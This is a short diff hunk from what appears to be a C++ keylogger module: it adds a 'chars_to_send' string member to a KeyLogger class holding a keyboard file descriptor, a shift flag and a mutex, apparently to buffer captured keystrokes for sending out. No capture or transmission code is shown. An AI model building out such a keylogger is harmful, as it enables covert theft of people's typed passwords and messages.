@@ -9,6 +9,7 @@
 class KeyLogger : public BaseModule
 {
 private:
+    std::string chars_to_send;
     unsigned int keyboard_fd;
     int shift_flag = 0;
     std::mutex mtx;
